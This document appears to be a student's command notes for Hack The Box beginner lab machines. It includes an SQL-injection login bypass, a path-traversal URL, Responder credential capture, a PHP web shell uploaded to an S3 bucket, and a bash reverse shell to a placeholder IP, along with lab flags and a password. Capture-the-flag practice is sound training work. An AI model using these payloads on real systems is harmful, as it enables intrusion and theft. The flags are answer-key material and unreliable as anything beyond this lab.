## Meow challenge:
- sudo openvpn {filename.opvn}
- ping {target_ip}
- sudo nmap -sV 10.129.239.25
- telnet {target_ip}


## Fawn challenge
- sudo nmap {target_ip}
- sudo nmap -sV {target_ip}
- sudo apt install ftp -y
- ftp -h
- ftp {target_ip}
  `username: anonymous
  `password:
- ftp> help
- ftp> ls
- ftp> get flag.txt
- ftp> bye
- cat flag.txt


## Dancing challenge:
- sudo nmap -sV {target_ip}
- sudo apt-get install smbclient
- smbclient -L 10.129.239.172
- smbclient \\\\10.129.239.172\\ADMIN$
- smbclient \\\\10.129.239.172\\C$
- smbclient \\\\10.129.239.172\\WorkShares
- smb: \> help
- smb: \> ls
- smb: \> cd Amy.J
- smb: \Amy.J\> ls
- smb: \Amy.J\> get worknotes.txt
- smb: \Amy.J\> cd ..
- smb: \> cd James.P
- smb: \James.P\> ls
- smb: \James.P\> get flag.txt
- cat flag.txt


## Redeemer challenge:
- sudo opstarting_point_ahmed00078.ovpn8.ovpn
- nmap -p- -sV 10.129.28.47
- sudo apt install redis-tools
- redis-cli --help
- redis-cli -h 10.129.28.47
- 10.129.28.47:6379> info
- 10.129.28.47:6379> select 0
- 10.129.28.47:6379> keys *
- 10.129.28.47:6379> get stor
- 10.129.28.47:6379> get temp
- 10.129.28.47:6379> get numb
- 10.129.28.47:6379> get flag


## Apointment challenge:
- sudo opstarting_point_ahmed00078.ovpn8.ovpn
- sudo nmap -sC -sV 10.129.164.88
- http://10.129.164.88/
- Username: admin'#
- Password: abc123


## Sequel challenge:
- sudo nmap -sC -sV 10.129.95.232
- sudo apt update && sudo apt install mysql *
- mysql --help
- mysql -h 10.129.95.232 -u root
- SHOW databases;
- USE htb;
- SHOW tables;
- SELECT * FROM config;


## Crocodile challenge:
- nmap -sC -sV 10.129.146.153
- ftp-anon: Anonymous FTP login allowed (FTP code 230)
- ftp 10.129.146.153
- Name (10.129.146.153:ahmed20078): anonymous
- ftp> help
- ftp> dir
- ftp> get allowed.userlist
- ftp> get allowed.userlist.passwd
- ftp> exit
- cat allowed.userlist
- cat allowed.userlist.passwd
- gobuster dir --url http://10.129.146.153/ --wordlist /media/ahmed20078/ahmed78/Documents/Cyber Projects/go/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html
- http://10.129.146.153/login.php
- admin:svndkfngksjvrdkufhkr


## Responder challenge:
- nmap -p- --min-rate 1000 -sV 10.129.95.234
- echo "10.129.95.234 unika.htb" | sudo tee -a /etc/hosts
- http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
- git clone https://github.com/lgandx/Responder
- sudo python2 Responder.py -I tun0
- flag: `ea81b7afddd03efaa0945333ed147fac`


## Three challenge:
- sudo nmap -sV 10.129.101.223
- echo "10.129.101.223 thetoppers.htb" | sudo tee -a /etc/hosts
- Tools: `gobuster` , `wfuzz` and `feroxbuster`
- gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb
- echo "10.129.101.223 s3.thetoppers.htb" | sudo tee -a /etc/hosts
- apt install awscli
- aws configure
- aws --endpoint=http://s3.thetoppers.htb s3 ls
- aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
- echo '<?php system($_GET["cmd"]); ?>' > shell.php
- aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
- http://thetoppers.htb/shell.php
- http://thetoppers.htb/shell.php?cmd=id
- ifconfig
- bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
- nc -nvlp 1337
- python3 -m http.server 8000
- cat /var/www/flag.txt
- flag: `a980d99281a28d638ac68b9bf9453c2b`
